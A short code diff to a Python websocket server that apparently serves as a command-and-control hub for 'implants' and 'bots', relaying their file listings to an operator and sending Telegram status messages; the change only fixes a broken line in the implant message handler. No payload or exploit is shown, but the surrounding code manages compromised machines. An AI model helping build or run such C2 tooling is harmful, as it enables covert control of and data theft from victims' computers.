@@ -58,7 +58,8 @@ async def websocket_handler(request):
                         }
                         await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                 elif client_type == 'implant':
-                    if data.get('type') == 'file_list_update':            if client_id in IMPLANTS:
+                    if data.get('type') == 'file_list_update':
+                        if client_id in IMPLANTS:
                             IMPLANTS[client_id]["files"] = data.get('files', {})
                             if OPERATOR:
                                 await broadcast_bot_list() # На всякий случай, если бот был в офлайне
@@ -106,3 +107,4 @@ if __name__ == "__main__":
         print("\nСервер остановлен вручную.")
     finally:
         send_telegram_message("🛑 Сервер 'Крепость' V2.0 остановлен.")
+
